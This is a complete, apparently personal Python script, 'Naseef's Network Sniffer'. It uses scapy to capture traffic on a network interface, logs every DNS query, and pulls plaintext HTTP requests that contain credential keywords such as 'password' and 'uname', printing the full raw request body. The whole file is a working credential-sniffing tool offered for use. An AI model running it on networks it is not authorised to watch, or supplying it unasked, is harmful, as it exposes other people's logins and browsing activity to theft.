# sniff.py

import scapy.all as scapy
from scapy.all import DNS, DNSQR
from scapy.layers import http
import argparse


def display_banner():
    banner = """
    *******************************************************
    *              Naseef's Network Sniffer              *
    *       Sniffing DNS queries and HTTP credentials     *
    *******************************************************
    """
    print(banner)


def get_domain(packet):
    """Extract domain from DNS query packets."""
    if packet.haslayer(DNS) and packet[DNS].opcode == 0:
        return packet[DNSQR].qname.decode()


def get_credentials(packet):
    """Check HTTP requests for sensitive keywords."""
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        try:
            raw = packet[scapy.Raw].load.decode(errors='ignore')
            keywords = ['username', 'password', 'login', 'passwd', 'uname']
            for keyword in keywords:
                if keyword in raw.lower():
                    print(f"[!] Possible credential leak found: {keyword} in {raw}")
                    return raw
        except Exception as e:
            pass


def process_sniffed_packet(packet):
    """Callback function to handle sniffed packets."""
    domain = get_domain(packet)
    if domain:
        print(f"[+] DNS Query: {domain}")

    creds = get_credentials(packet)
    if creds:
        print(f"[+] Credentials Found: {creds}")


def sniff(interface):
    """Start sniffing on given interface."""
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def main():
    display_banner()

    parser = argparse.ArgumentParser(description="Network packet sniffer tool by Naseef")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on (e.g., eth0, wlan0)")
    args = parser.parse_args()

    print(f"[*] Starting sniffing on interface: {args.interface}")
    sniff(args.interface)


if __name__ == "__main__":
    main()
